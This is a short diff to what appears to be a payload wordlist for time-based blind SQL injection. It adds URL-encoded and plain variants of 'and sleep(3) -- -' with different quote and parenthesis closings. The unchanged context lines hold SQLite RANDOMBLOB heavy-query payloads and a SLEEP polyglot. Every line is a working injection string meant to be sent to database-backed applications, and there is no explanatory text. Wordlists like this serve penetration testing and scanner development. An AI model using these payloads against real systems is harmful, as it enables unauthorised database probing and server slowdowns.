@@ -92,5 +92,15 @@ RANDOMBLOB(1000000000/2)
 AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
-%27and%20sleep(3)%20--%20
-%20and%20sleep(3)%20--%20
+%27and%20sleep(3)%20--%20-
+%20and%20sleep(3)%20--%20-
+%27)%20and%20sleep(3)%20--%20-
+")%20and%20sleep(3)%20--%20-
+"%20and%20sleep(3)%20--%20-
+%27))%20and%20sleep(3)%20--%20-
+' and sleep(3) -- -
+ and sleep(3) -- -
+') and sleep(3) -- -
+") and sleep(3) -- -
+" and sleep(3) -- -
+')) and sleep(3) -- -
